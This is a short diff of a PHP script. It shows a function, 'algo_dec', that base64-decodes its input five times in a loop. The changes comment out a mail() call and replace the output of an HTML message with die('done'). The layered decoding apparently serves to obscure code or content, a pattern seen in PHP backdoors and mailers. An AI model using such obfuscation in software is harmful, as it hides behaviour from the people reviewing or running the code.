@@ -6,7 +6,7 @@ if(
 	)
 {
 		
-		
+		// sleep(2);	
 	function algo_dec($d){
 	  for($i=0;$i<5;$i++){
 	    $dx = base64_decode($d);
@@ -62,10 +62,12 @@ if(
 					 </html>
 				 	';
 
-
 	 // mail($to, $subject, $message, $headers);
-	 
-	 die($message);
+			
+
+
+	 // die($message);
+				 	die("done");
 
 
 
